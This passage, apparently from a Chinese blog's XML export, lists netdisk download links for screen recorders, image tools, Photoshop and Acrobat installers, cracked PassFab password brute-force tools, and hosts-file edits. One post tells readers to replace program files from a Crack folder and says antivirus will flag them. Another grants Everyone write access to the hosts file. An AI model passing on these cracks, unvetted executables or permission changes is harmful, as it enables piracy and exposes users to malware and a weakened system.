class="line">172.217.0.46 translate.googleapis.com</span><br><span class="line">172.217.31.142 translate.googleapis.com</span><br><span class="line">216.58.220.142 translate.googleapis.com</span><br><span class="line">172.217.13.142 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
        <category>translate</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>google translate</tag>
        <tag>外语翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 录屏软件 绿色，免费，无广告</title>
    <url>/posts/92d14028/</url>
    <content><![CDATA[<h1 id="爱思录屏提取版-rar-https-wwm-lanzouw-com-iSEm20dg61re-密码-3mgt"><a href="#爱思录屏提取版-rar-https-wwm-lanzouw-com-iSEm20dg61re-密码-3mgt" class="headerlink" title="爱思录屏提取版.rar https://wwm.lanzouw.com/iSEm20dg61re 密码:3mgt"></a>爱思录屏提取版.rar <a href="https://wwm.lanzouw.com/iSEm20dg61re">https://wwm.lanzouw.com/iSEm20dg61re</a> 密码:3mgt</h1><h1 id="土豆录屏官网：http-www-tudouluping-com"><a href="#土豆录屏官网：http-www-tudouluping-com" class="headerlink" title="土豆录屏官网：http://www.tudouluping.com/"></a>土豆录屏官网：<a href="http://www.tudouluping.com/">http://www.tudouluping.com/</a></h1><h1 id="土豆录屏-rar-https-wwm-lanzouw-com-idNGK0dg63fe-密码-3mv2"><a href="#土豆录屏-rar-https-wwm-lanzouw-com-idNGK0dg63fe-密码-3mv2" class="headerlink" title="土豆录屏.rar https://wwm.lanzouw.com/idNGK0dg63fe 密码:3mv2"></a>土豆录屏.rar <a href="https://wwm.lanzouw.com/idNGK0dg63fe">https://wwm.lanzouw.com/idNGK0dg63fe</a> 密码:3mv2</h1><h1 id="云豹录屏大师-zip-https-wwm-lanzouw-com-iDbqV0dg65lc-密码-fgom"><a href="#云豹录屏大师-zip-https-wwm-lanzouw-com-iDbqV0dg65lc-密码-fgom" class="headerlink" title="云豹录屏大师.zip https://wwm.lanzouw.com/iDbqV0dg65lc 密码:fgom"></a>云豹录屏大师.zip <a href="https://wwm.lanzouw.com/iDbqV0dg65lc">https://wwm.lanzouw.com/iDbqV0dg65lc</a> 密码:fgom</h1><h1 id="EV录屏绿色版-zip-https-wwm-lanzouw-com-iwiuw0dg69ch-密码-1udf"><a href="#EV录屏绿色版-zip-https-wwm-lanzouw-com-iwiuw0dg69ch-密码-1udf" class="headerlink" title="EV录屏绿色版.zip https://wwm.lanzouw.com/iwiuw0dg69ch 密码:1udf"></a>EV录屏绿色版.zip <a href="https://wwm.lanzouw.com/iwiuw0dg69ch">https://wwm.lanzouw.com/iwiuw0dg69ch</a> 密码:1udf</h1><h1 id="在线录屏-https-ouweiya-github-io-Web-recording-screen"><a href="#在线录屏-https-ouweiya-github-io-Web-recording-screen" class="headerlink" title="在线录屏 https://ouweiya.github.io/Web-recording-screen/"></a>在线录屏 <a href="https://ouweiya.github.io/Web-recording-screen/">https://ouweiya.github.io/Web-recording-screen/</a></h1>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 抠图等轻量级图片处理软件和网站</title>
    <url>/posts/a3b77e6f/</url>
    <content><![CDATA[<p>PhotoDemon-9.0.zip<br><a href="https://wwm.lanzouw.com/ihisr0dg89na">https://wwm.lanzouw.com/ihisr0dg89na</a> 密码:3exv</p>
<p>图去水印工具.exe<br><a href="https://wwm.lanzouw.com/iilh60dg99dg">https://wwm.lanzouw.com/iilh60dg99dg</a> 密码:ayqg</p>
<p>改图鸭<br><a href="https://www.gaituya.com/">https://www.gaituya.com/</a></p>
<p>自动替换图像的背景<br><a href="https://bgsub.cn/">https://bgsub.cn/</a></p>
<p>魔术橡皮擦<br><a href="https://www.magiceraser.io/">https://www.magiceraser.io/</a></p>
<p>AI 魔术橡皮擦<br><a href="https://jpgrm.com/">https://jpgrm.com/</a></p>
<p>擦除多余物体<br><a href="https://remover.zmo.ai/">https://remover.zmo.ai/</a></p>
<p>顽兔抠图<br><a href="https://alidesign.taobao.com/work.htm#/iframe/wantoo">https://alidesign.taobao.com/work.htm#/iframe/wantoo</a></p>
<p>图片背景消除<br><a href="https://www.remove.bg/zh">https://www.remove.bg/zh</a></p>
<p>改图神器<br><a href="https://img.logosc.cn/">https://img.logosc.cn/</a></p>
<p>在线抠图</p>
<ol>
<li><a href="https://huggingface.co/spaces/not-lain/background-removal">https://huggingface.co/spaces/not-lain/background-removal</a></li>
<li><a href="https://huggingface.co/spaces/finegrain/finegrain-object-cutter">https://huggingface.co/spaces/finegrain/finegrain-object-cutter</a></li>
<li><a href="https://huggingface.co/spaces/Xenova/remove-background-webgpu">Remove Background WebGPU - a Hugging Face Space by Xenova</a></li>
<li><a href="https://pixian.ai/">https://pixian.ai/</a></li>
<li><a href="https://picwish.cn/remove-background">https://picwish.cn/remove-background</a></li>
<li><a href="https://picwish.cn/create">https://picwish.cn/create</a></li>
<li><a href="https://segment-anything.com/demo#">https://segment-anything.com/demo#</a></li>
<li><a href="https://photokit.com/">https://photokit.com/</a></li>
<li><a href="https://bgsub.com/">https://bgsub.com/</a></li>
<li><a href="https://img.logosc.cn/remove-bg">https://img.logosc.cn/remove-bg</a></li>
<li><a href="https://www.quzuotu.com/home">https://www.quzuotu.com/home</a></li>
</ol>
<p>离线抠图软件</p>
<ol>
<li><a href="https://kt.94xy.com/">https://kt.94xy.com/</a></li>
</ol>
<p>证件照</p>
<ol>
<li><a href="https://swanhub.co/ZeYiLin/HivisionIDPhotos/demo">https://swanhub.co/ZeYiLin/HivisionIDPhotos/demo</a></li>
</ol>
<p>图片去水印、高清放大</p>
<ol>
<li><a href="https://inpaintweb.lxfater.com/">Inpaint-web</a></li>
</ol>
<p>AI 一键换衣</p>
<ol>
<li><a href="https://huggingface.co/spaces/Kwai-Kolors/Kolors-Virtual-Try-On">Kolors Virtual Try-On - a Hugging Face Space by Kwai-Kolors</a></li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 去除 pdf 水印的软件</title>
    <url>/posts/e3eb92ac/</url>
    <content><![CDATA[<h1 id="Acrobat-DC"><a href="#Acrobat-DC" class="headerlink" title="Acrobat_DC"></a>Acrobat_DC</h1><p>Acrobat_DC_C_2019.021.20061_SP_20191220.exe<br>链接: <a href="https://pan.baidu.com/s/11Nn8NOCo3_ifPQES6Lf_nA?pwd=dbuf">https://pan.baidu.com/s/11Nn8NOCo3_ifPQES6Lf_nA?pwd=dbuf</a> 提取码: dbuf 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="Acrobat-DC的一款插件pitstop"><a href="#Acrobat-DC的一款插件pitstop" class="headerlink" title="Acrobat_DC的一款插件pitstop"></a>Acrobat_DC的一款插件pitstop</h1><p>pitstop和谐版<a href="https://www.aliyundrive.com/s/RfEQ6aMPbBo">https://www.aliyundrive.com/s/RfEQ6aMPbBo</a></p>
<h1 id="福昕PDF"><a href="#福昕PDF" class="headerlink" title="福昕PDF"></a>福昕PDF</h1><p>FoxitPhantomPDFBusiness970Portable_4.exe<br>链接: <a href="https://pan.baidu.com/s/1DFEnl0SP0Wi8q1aIGA3dgg?pwd=x32b">https://pan.baidu.com/s/1DFEnl0SP0Wi8q1aIGA3dgg?pwd=x32b</a> 提取码: x32b 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="PDF-XChange"><a href="#PDF-XChange" class="headerlink" title="PDF-XChange"></a>PDF-XChange</h1><p>PDF-XChange共用安装包 <a href="https://downloads.pdf-xchange.com/PDFXPro9.zip">https://downloads.pdf-xchange.com/PDFXPro9.zip</a><br>64位安装版 <a href="https://downloads.pdf-xchange.com/ProV9.x64.msi">https://downloads.pdf-xchange.com/ProV9.x64.msi</a><br>32位安装版 <a href="https://downloads.pdf-xchange.com/ProV89.x86.msi">https://downloads.pdf-xchange.com/ProV89.x86.msi</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>pdf</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>pdf</tag>
      </tags>
  </entry>
  <entry>
    <title>photoshop 字体收藏 ttf 和 ps2021，2022，2023 neural filters 神经网络滤镜安装包</title>
    <url>/posts/d17e717c/</url>
    <content><![CDATA[<h1 id="Photoshop-2021-链接-https-pan-baidu-com-s-1xRdwsLIbOKuewZymriSa5Q-pwd-p9sr-提取码-p9sr-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#Photoshop-2021-链接-https-pan-baidu-com-s-1xRdwsLIbOKuewZymriSa5Q-pwd-p9sr-提取码-p9sr-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="Photoshop 2021 链接: https://pan.baidu.com/s/1xRdwsLIbOKuewZymriSa5Q?pwd=p9sr 提取码: p9sr 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>Photoshop 2021 链接: <a href="https://pan.baidu.com/s/1xRdwsLIbOKuewZymriSa5Q?pwd=p9sr">https://pan.baidu.com/s/1xRdwsLIbOKuewZymriSa5Q?pwd=p9sr</a> 提取码: p9sr 复制这段内容后打开百度网盘手机App，操作更方便哦</h1><h1 id="Photoshop-2022-链接-https-pan-baidu-com-s-1FURILq16WgbC1DG-TEIR4Q-pwd-nfih-提取码-nfih-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#Photoshop-2022-链接-https-pan-baidu-com-s-1FURILq16WgbC1DG-TEIR4Q-pwd-nfih-提取码-nfih-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="Photoshop 2022 链接: https://pan.baidu.com/s/1FURILq16WgbC1DG_TEIR4Q?pwd=nfih 提取码: nfih 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>Photoshop 2022 链接: <a href="https://pan.baidu.com/s/1FURILq16WgbC1DG_TEIR4Q?pwd=nfih">https://pan.baidu.com/s/1FURILq16WgbC1DG_TEIR4Q?pwd=nfih</a> 提取码: nfih 复制这段内容后打开百度网盘手机App，操作更方便哦</h1><h1 id="PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版-链接-https-pan-baidu-com-s-1UOO5CzNjfd-O7Qeo-BvT9g-pwd-s8jn-提取码-s8jn-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版-链接-https-pan-baidu-com-s-1UOO5CzNjfd-O7Qeo-BvT9g-pwd-s8jn-提取码-s8jn-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版 链接: https://pan.baidu.com/s/1UOO5CzNjfd-O7Qeo-BvT9g?pwd=s8jn 提取码: s8jn 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>PS2021-PS2022神经网络滤镜离线完整组件包2022年6月版 链接: <a href="https://pan.baidu.com/s/1UOO5CzNjfd-O7Qeo-BvT9g?pwd=s8jn">https://pan.baidu.com/s/1UOO5CzNjfd-O7Qeo-BvT9g?pwd=s8jn</a> 提取码: s8jn 复制这段内容后打开百度网盘手机App，操作更方便哦</h1><h1 id="Photoshop-2023-链接-https-pan-baidu-com-s-1kO-ktG08goIrkSFvyV9DVQ-pwd-x9qe-提取码-x9qe-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#Photoshop-2023-链接-https-pan-baidu-com-s-1kO-ktG08goIrkSFvyV9DVQ-pwd-x9qe-提取码-x9qe-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="Photoshop 2023 链接: https://pan.baidu.com/s/1kO-ktG08goIrkSFvyV9DVQ?pwd=x9qe 提取码: x9qe 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>Photoshop 2023 链接: <a href="https://pan.baidu.com/s/1kO-ktG08goIrkSFvyV9DVQ?pwd=x9qe">https://pan.baidu.com/s/1kO-ktG08goIrkSFvyV9DVQ?pwd=x9qe</a> 提取码: x9qe 复制这段内容后打开百度网盘手机App，操作更方便哦</h1><h1 id="PS-2023-Neural-Filterss-神经网络滤镜-链接-https-pan-baidu-com-s-1reRP6JP0s3sh3-kd973rxQ-pwd-pksb-提取码-pksb-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#PS-2023-Neural-Filterss-神经网络滤镜-链接-https-pan-baidu-com-s-1reRP6JP0s3sh3-kd973rxQ-pwd-pksb-提取码-pksb-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="PS 2023-Neural Filterss 神经网络滤镜 链接: https://pan.baidu.com/s/1reRP6JP0s3sh3-kd973rxQ?pwd=pksb 提取码: pksb 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>PS 2023-Neural Filterss 神经网络滤镜 链接: <a href="https://pan.baidu.com/s/1reRP6JP0s3sh3-kd973rxQ?pwd=pksb">https://pan.baidu.com/s/1reRP6JP0s3sh3-kd973rxQ?pwd=pksb</a> 提取码: pksb 复制这段内容后打开百度网盘手机App，操作更方便哦</h1><h1 id="苹果苹方字体（繁、简）"><a href="#苹果苹方字体（繁、简）" class="headerlink" title="苹果苹方字体（繁、简）"></a>苹果苹方字体（繁、简）</h1><p><a href="https://wwm.lanzouw.com/iQwNG0dlvigf">https://wwm.lanzouw.com/iQwNG0dlvigf</a> 密码:g2b4</p>
<h1 id="华文彩云-ttf"><a href="#华文彩云-ttf" class="headerlink" title="华文彩云.ttf"></a>华文彩云.ttf</h1><p><a href="https://wwm.lanzouw.com/i9kZl0dlyq9e">https://wwm.lanzouw.com/i9kZl0dlyq9e</a> 密码:djmr</p>
<h1 id="华文圆体-REGULAR-ttf"><a href="#华文圆体-REGULAR-ttf" class="headerlink" title="华文圆体 REGULAR.ttf"></a>华文圆体 REGULAR.ttf</h1><p><a href="https://wwm.lanzouw.com/ii3oY0dlyr3e">https://wwm.lanzouw.com/ii3oY0dlyr3e</a> 密码:g70q</p>
<h1 id="华文琥珀-ttf"><a href="#华文琥珀-ttf" class="headerlink" title="华文琥珀.ttf"></a>华文琥珀.ttf</h1><p><a href="https://wwm.lanzouw.com/iNZYX0dlyrub">https://wwm.lanzouw.com/iNZYX0dlyrub</a> 密码:gis4</p>
<h1 id="思源黑体字体打包"><a href="#思源黑体字体打包" class="headerlink" title="思源黑体字体打包"></a>思源黑体字体打包</h1><p>链接: <a href="https://pan.baidu.com/s/1voET05zj-WRgm4pvi0eFwQ?pwd=n3fu">https://pan.baidu.com/s/1voET05zj-WRgm4pvi0eFwQ?pwd=n3fu</a> 提取码: n3fu 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>photoshop</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>photoshop</tag>
      </tags>
  </entry>
  <entry>
    <title>迅雷下载任务包含违规内容-修改hosts解决迅雷无法下载步骤</title>
    <url>/posts/979beb9d/</url>
    <content><![CDATA[<p>很多小伙伴在使用迅雷下载的时候，下载包提示任务包含违规内容，无法继续下载，检测到你的位置服务器异常。我们可以通过修改hosts的方式来解决这个问题，具体的教程下面一起来看看吧。</p>
<p>添加到本机Hosts文件：<strong>C:\Windows\System32\drivers\etc\hosts</strong></p>
<p><img src="/upload/2022/10/a2fbea63ea_1.jpg" alt="a2fbea63ea_1"></p>
<p>需要添加的信息如下：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> hub5btmain.sandai.<span class="built_in">net</span></span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> hub5emu.sandai.<span class="built_in">net</span></span><br><span class="line"></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> upgrade.xl9.xunlei.com</span><br></pre></td></tr></table></figure>

<p>好啦，以上就是迅雷怎么改hosts文件的全部内容啦，按照以上方法操作，你就能轻松掌握hosts文件修改方法了。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>xunlei</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>xunlei</tag>
      </tags>
  </entry>
  <entry>
    <title>搞机工具箱-全安卓通用玩机神器 v9.22</title>
    <url>/posts/dc8d9efd/</url>
    <content><![CDATA[<p>免ROOT:所有功能均无需ROOT，Android全机型通用<br>简洁易用:全图形化界面，一键操作，告别手打代码<br>通俗易懂:各功能说明清晰，配合图文视频等教程，新手也能轻松入门<br>功能尽有:功能多而强大，满足多种玩机场景<br>无需UAC:自带驱动，无需管理员权限，可在网吧等公共机房完美使用<br>小而美:超小体积，超快启动！</p>
<p>搞机工具箱_9.22_Portable<br><a href="https://wwm.lanzouw.com/iOfrU0dxofcd">https://wwm.lanzouw.com/iOfrU0dxofcd</a> 密码:fe8p</p>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌google翻译修复工具ggboom(V1.1.0)</title>
    <url>/posts/b8dcbbf7/</url>
    <content><![CDATA[<p>GGBoom(V1.1.0)<br><a href="https://wwm.lanzouw.com/iagAZ0ge5hha">https://wwm.lanzouw.com/iagAZ0ge5hha</a> 密码:h1se</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">142.250.111.90 translate.googleapis.com</span><br><span class="line">172.217.215.90 translate.googleapis.com</span><br><span class="line">142.250.11.90 translate.googleapis.com</span><br><span class="line">142.251.9.90 translate.googleapis.com</span><br><span class="line">108.177.122.90 translate.googleapis.com</span><br><span class="line">142.250.96.90 translate.googleapis.com</span><br><span class="line">142.250.100.90 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.214.90 translate.googleapis.com</span><br><span class="line">172.217.222.90 translate.googleapis.com</span><br><span class="line">142.250.31.90 translate.googleapis.com</span><br><span class="line">142.250.126.90 translate.googleapis.com</span><br><span class="line">142.250.10.90 translate.googleapis.com</span><br><span class="line">172.217.195.90 translate.googleapis.com</span><br><span class="line">172.253.115.90 translate.googleapis.com</span><br><span class="line">142.251.5.90 translate.googleapis.com</span><br><span class="line">142.250.136.90 translate.googleapis.com</span><br><span class="line">142.250.12.90 translate.googleapis.com</span><br><span class="line">142.250.101.90 translate.googleapis.com</span><br><span class="line">172.217.192.90 translate.googleapis.com</span><br><span class="line">142.250.0.90 translate.googleapis.com</span><br><span class="line">142.250.107.90 translate.googleapis.com</span><br><span class="line">172.217.204.90 translate.googleapis.com</span><br><span class="line">142.250.28.90 translate.googleapis.com</span><br><span class="line">142.250.125.90 translate.googleapis.com</span><br><span class="line">172.253.124.90 translate.googleapis.com</span><br><span class="line">142.250.8.90 translate.googleapis.com</span><br><span class="line">142.250.128.90 translate.googleapis.com</span><br><span class="line">142.250.112.90 translate.googleapis.com</span><br><span class="line">142.250.27.90 translate.googleapis.com</span><br><span class="line">142.250.105.90 translate.googleapis.com</span><br><span class="line">172.253.126.90 translate.googleapis.com</span><br><span class="line">172.253.123.90 translate.googleapis.com</span><br><span class="line">172.253.122.90 translate.googleapis.com</span><br><span class="line">172.253.62.90 translate.googleapis.com</span><br><span class="line">142.250.98.90 translate.googleapis.com</span><br><span class="line">142.250.185.238 translate.googleapis.com</span><br><span class="line">142.251.116.101 translate.googleapis.com</span><br><span class="line">216.58.214.14 translate.googleapis.com</span><br><span class="line">142.250.189.206 translate.googleapis.com</span><br><span class="line">216.58.209.174 translate.googleapis.com</span><br><span class="line">142.250.203.142 translate.googleapis.com</span><br><span class="line">142.250.218.14 translate.googleapis.com</span><br><span class="line">142.251.10.138 translate.googleapis.com</span><br><span class="line">142.251.40.174 translate.googleapis.com</span><br><span class="line">142.250.185.174 translate.googleapis.com</span><br><span class="line">172.217.16.46 translate.googleapis.com</span><br><span class="line">172.217.0.46 translate.googleapis.com</span><br><span class="line">172.217.31.142 translate.googleapis.com</span><br><span class="line">216.58.220.142 translate.googleapis.com</span><br><span class="line">172.217.13.142 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>tools</category>
        <category>translate</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>google translate</tag>
        <tag>外语翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>文本转语音，文本朗读，自然人声语音合成</title>
    <url>/posts/88b7e569/</url>
    <content><![CDATA[<p>文本转语音1.8汉化版<br><a href="https://wwm.lanzouw.com/ivjOO0dxqsab">https://wwm.lanzouw.com/ivjOO0dxqsab</a> 密码:648x</p>
<p>微软语音合成助手1.5.1<br><a href="https://wwm.lanzouw.com/iCN3x0dxqsri">https://wwm.lanzouw.com/iCN3x0dxqsri</a> 密码:frw0</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>tts</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>tts</tag>
      </tags>
  </entry>
  <entry>
    <title>macos系统升级，镜像</title>
    <url>/posts/7203f7a9/</url>
    <content><![CDATA[<p>macOS Monterey<br><a href="https://apps.apple.com/cn/app/macos-monterey/id1576738294?mt=12">https://apps.apple.com/cn/app/macos-monterey/id1576738294?mt=12</a></p>
<p>Mac_OS_X_10.8.5_InstallESD.dmg<br>链接: <a href="https://pan.baidu.com/s/1J9tNJqyV2B5UrEzflNHR1A?pwd=f9dj">https://pan.baidu.com/s/1J9tNJqyV2B5UrEzflNHR1A?pwd=f9dj</a> 提取码: f9dj 复制这段内容后打开百度网盘手机App，</p>
<p>Install OS X El Capitan 10.11.5 15F34.dmg<br>链接: <a href="https://pan.baidu.com/s/1LrFNVieAtJgEDD2r-sAsIg?pwd=c4yt">https://pan.baidu.com/s/1LrFNVieAtJgEDD2r-sAsIg?pwd=c4yt</a> 提取码: c4yt 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<p>OS X 10.12.1.dmg<br>链接: <a href="https://pan.baidu.com/s/1bdXL94tf81s85AQ57ljxSw?pwd=ph9h">https://pan.baidu.com/s/1bdXL94tf81s85AQ57ljxSw?pwd=ph9h</a> 提取码: ph9h 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<p>macOS 10.13.6 High Sierra.dmg<br>链接: <a href="https://pan.baidu.com/s/1bdXL94tf81s85AQ57ljxSw?pwd=ph9h">https://pan.baidu.com/s/1bdXL94tf81s85AQ57ljxSw?pwd=ph9h</a> 提取码: ph9h 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<p>Install.macOS.Mojave.10.14.dmg<br>链接: <a href="https://pan.baidu.com/s/1DkV1HzOVggAkBYxWy4BcLg?pwd=h9fw">https://pan.baidu.com/s/1DkV1HzOVggAkBYxWy4BcLg?pwd=h9fw</a> 提取码: h9fw 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 10 获得修改 hosts 文件权限</title>
    <url>/posts/263343f6/</url>
    <content><![CDATA[<p>在对系统文件进行一些编辑操作的时候，hosts文件一直都是比较难修改的，可能会遇到无修改权限的提示。那么当win10提示无权限修改hosts文件怎么办？下面小编教下大家win10无法修改hosts文件的解决方法。</p>
<p>具体步骤如下：</p>
<p>1、打开电脑C盘-Windows文件夹-system32文件夹-drivers文件夹-etc文件夹，找到hosts文件。</p>
<p><img src="/img/host/1.webp" alt="a20ee060aa_1"></p>
<p>2、鼠标右击hosts文件，选择属性。</p>
<p>3、点击安全，编辑。</p>
<p><img src="/img/host/2.webp" alt="a20ee060aa_3"></p>
<p>4、这里就可以添加权限了，点击添加。</p>
<p><img src="/img/host/3.webp" alt="a20ee060aa_4"></p>
<p>5、输入everyone，点击确定。</p>
<p><img src="/img/host/4.webp" alt="a20ee060aa_5"></p>
<p>6、然后返回，选择允许修改等权限，应用并确定即可。</p>
<p><img src="/img/host/5.webp" alt="a20ee060aa_6"></p>
<p>以上便是win10无法修改hosts文件的解决方法。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>office文档权限解除工具-unprotector</title>
    <url>/posts/a264da04/</url>
    <content><![CDATA[<p>UnProtector 免费版是一款Office文档权限解除工具&#x2F;去除工具。<br>操作很简单，只需要将解除权限密码的文档拖入软件内，软件就会在原文件夹下生成一个已经解除权限密码的文档。UnProtector支持的格式有PDF、docx、pptx、xlsx，但是不支持doc、ppt和xls，可以通过另存为把旧文档格式转换成新的格式即可。</p>
<p>使用注意 这款工具解除的是文档的权限，不是不能解开加密的文档</p>
<p>UnProtector_v2.5<br><a href="https://wwm.lanzouw.com/i3xPl0e19umh">https://wwm.lanzouw.com/i3xPl0e19umh</a> 密码:9pt1</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>密码工具 passfab for rar、zip、pdf、office</title>
    <url>/posts/53b2c920/</url>
    <content><![CDATA[<p>Passfab是国外某公司开发的密码暴力工具，<br>支持PDF&#x2F;rar&#x2F;zip&#x2F;word&#x2F;excel&#x2F;PPT等多种文件的密码暴力，<br>因此它也被分为四款软件（PassFab for RAR、PassFab for ZIP、PassFab for PDF、PassFab for Office），每款软件分别对应一种格式。<br>PassFab安装使用<br>以PassFab for Zip为例，下载文件后解压，得到一个主文件和Crack文件夹，双击exe文件运行安装程序<br>安装完成后不要运行程序，打开解压文件下的Crack文件夹，复制里面的全部文件到PassFab for RAR安装路径下粘贴<br>提示文件重复，替换目标中的文件<br>替换完可以直接打开主程序了，一键成功激活了，解开加密文件的步骤大家可以自行测试哈，<br>电脑会报毒，介意这类提示的勿用，或者自行用全新虚拟机使用</p>
<p>PassFab for office.zip<br><a href="https://wwm.lanzouw.com/iXEWK0e19v5g">https://wwm.lanzouw.com/iXEWK0e19v5g</a> 密码:53hi</p>
<p>PassFab for PDF.zip<br><a href="https://wwm.lanzouw.com/ij6Or0e19vwd">https://wwm.lanzouw.com/ij6Or0e19vwd</a> 密码:dbex</p>
<p>PassFab For ZIP.zip<br><a href="https://wwm.lanzouw.com/iTNcT0e19w2j">https://wwm.lanzouw.com/iTNcT0e19w2j</a> 密码:8fty</p>
<p>PassFab.for_RAR.zip<br><a href="https://wwm.lanzouw.com/i4bzZ0e19w7e">https://wwm.lanzouw.com/i4bzZ0e19w7e</a> 密码:4p7z</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>mac电脑进入 macos 恢复模式在线重装系统</title>
    <url>/posts/24b1e403/</url>
    <content><![CDATA[<h1 id="从-macOS-恢复模式工具启动"><a href="#从-macOS-恢复模式工具启动" class="headerlink" title="从 macOS 恢复模式工具启动"></a>从 macOS 恢复模式工具启动</h1><p>首先确保你的 Mac电脑已经联网。</p>
<h2 id="Apple-芯片Mac进入方法"><a href="#Apple-芯片Mac进入方法" class="headerlink" title="Apple 芯片Mac进入方法"></a>Apple 芯片Mac进入方法</h2><p>将 Mac 开机并继续按住电源按钮，直到看到启动选项窗口。点按标有“选项”字样的齿轮图标，然后点按“继续”。</p>
<h2 id="Intel-芯片Mac进入方法"><a href="#Intel-芯片Mac进入方法" class="headerlink" title="Intel 芯片Mac进入方法"></a>Intel 芯片Mac进入方法</h2><p>将 Mac 开机并立即按住 Command (?)-R，直到看到 Apple 标志或其他图像，再松开按键。</p>
<p>如果系统提示选择用户的话，选择一个你知道密码的用户，点按“下一步”，然后输入用户的管理员密码(也就是这个用户的Mac开机密码)。<br><img src="/img/mac/1.webp" alt="macos-big-sur-recovery-password-prompt"></p>
<h1 id="看到实用工具窗口时，表示已经进入恢复模式工具："><a href="#看到实用工具窗口时，表示已经进入恢复模式工具：" class="headerlink" title="看到实用工具窗口时，表示已经进入恢复模式工具："></a>看到实用工具窗口时，表示已经进入恢复模式工具：</h1><p><img src="/img/mac/2.webp" alt="macos-big-sur-recovery-utilities"><br>使用“磁盘工具”抹掉原来的Mac系统盘<br>从实用工具窗口中，选择“磁盘工具”，然后点按“继续”。<br><img src="/img/mac/3.webp" alt="macos-big-sur-recovery-disk"><br>进入磁盘工具之后，在在“磁盘工具”左边栏中选择“Macintosh HD”(如果有Macintosh HD – Date，不用管它，我们只要抹掉Macintosh HD就行),然后点击点按工具栏中的“抹掉”按钮，然后输入所需的详细信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">名称默认：Macintosh HD</span><br><span class="line"></span><br><span class="line">格式选择：“APFS”第一个或“Mac OS 扩展（日志式）”第一个，不要选择有加密字样的；</span><br></pre></td></tr></table></figure>

<p>最后点击“抹掉宗卷组”，如果没有看到这个按钮，改为点右边的“抹掉”按钮开始抹掉mac盘；<br><img src="/img/mac/4.webp" alt="macos-big-sur-recovery-mode-disk-utility-erase-volume-group"><br>成功抹掉之后，再点击磁盘工具左上角的红色按钮关闭磁盘工具回到实用工具界面。</p>
